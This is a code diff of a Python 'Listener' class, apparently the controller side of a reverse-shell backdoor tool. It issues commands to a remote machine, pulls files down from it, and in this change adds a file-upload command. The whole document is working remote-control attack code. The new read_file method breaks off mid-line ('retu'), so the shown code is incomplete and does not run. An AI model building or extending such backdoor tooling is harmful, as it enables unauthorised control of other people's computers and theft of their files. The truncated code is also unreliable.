@@ -1,6 +1,6 @@
 import json
 import socket 
-from base64 import b64decode
+from base64 import b64decode, b64encode
 from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
 
 class Listener:
@@ -36,14 +36,25 @@ class Listener:
         with open(path, 'wb') as file:
             file.write(b64decode(content))
             return '[+] Download successful.'
+    
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            retu
 
     def run(self):
         while True:
             command = input('>> ')
             command = command.split(' ')
+
+            if command[0] == 'upload': # ['upload', 'file name'].append('file content as binary')
+                file_content = self.read_file(command[1])
+                command.append(file_content)
+
+
+
             result = self.execute_remote_command(command)
 
-            if command[0] == 'download':
+            if command[0] == 'download':  # ['download', 'file name']
                 self.write_file(command[1], result)
 
             print(result)
